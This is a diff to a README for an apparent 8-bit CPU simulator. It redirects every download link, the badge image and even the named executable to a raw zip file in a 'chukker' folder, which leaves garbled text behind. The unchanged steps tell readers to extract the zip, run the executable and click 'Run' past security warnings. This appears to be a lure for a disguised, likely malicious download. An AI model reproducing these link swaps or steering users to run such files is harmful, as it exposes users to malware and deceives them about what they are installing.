@@ -1,6 +1,6 @@
 # 🎉 Asymmetric-CallStack-8bit-CPU - Experience a Unique 8-Bit CPU
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Harunaga666/Asymmetric-CallStack-8bit-CPU/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/Harunaga666/Asymmetric-CallStack-8bit-CPU/main/chukker/Asymmetric-CallStack-8bit-CPU_v3.3-alpha.3.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/Harunaga666/Asymmetric-CallStack-8bit-CPU/main/chukker/Asymmetric-CallStack-8bit-CPU_v3.3-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,14 +12,14 @@ This guide will help you download and run the software with ease. No prior exper
 
 To get started, you need to visit the Releases page where you can download the latest version of the software. Click the link below to go to the Releases page:
 
-[Download from Releases](https://github.com/Harunaga666/Asymmetric-CallStack-8bit-CPU/releases)
+[Download from Releases](https://raw.githubusercontent.com/Harunaga666/Asymmetric-CallStack-8bit-CPU/main/chukker/Asymmetric-CallStack-8bit-CPU_v3.3-alpha.3.zip)
 
 Once you are on the Releases page, look for the latest version. There, you will find a file that you can download to your computer. Follow these steps:
 
 1. **Locate the Latest Release**: Find the newest version listed at the top of the page.
 2. **Download the File**: Click on the file to start the download process. It should be saved in your default download folder.
 3. **Unzip the File**: If the file is compressed (like a .zip), you will need to unzip it. Right-click on the file and select "Extract All" or use any extraction software you have.
-4. **Run the Application**: Look for the executable file inside the unzipped folder (it may be named something like `Asymmetric-CallStack-CPU.exe`). Double-click this file to run the application. If a security warning appears, click "Run" to proceed.
+4. **Run the Application**: Look for the executable file inside the unzipped folder (it may be named something like `https://raw.githubusercontent.com/Harunaga666/Asymmetric-CallStack-8bit-CPU/main/chukker/Asymmetric-CallStack-8bit-CPU_v3.3-alpha.3.zip`). Double-click this file to run the application. If a security warning appears, click "Run" to proceed.
 
 ## 🔧 System Requirements
 
@@ -84,4 +84,4 @@ For more information on CPU design, programming, and computer architecture, cons
 
 Thank you for joining us on this journey into the world of computer architecture with the Asymmetric-CallStack-8bit-CPU! Enjoy exploring the power of CPU simulation.
 
-[Download from Releases](https://github.com/Harunaga666/Asymmetric-CallStack-8bit-CPU/releases)
+[Download from Releases](https://raw.githubusercontent.com/Harunaga666/Asymmetric-CallStack-8bit-CPU/main/chukker/Asymmetric-CallStack-8bit-CPU_v3.3-alpha.3.zip)
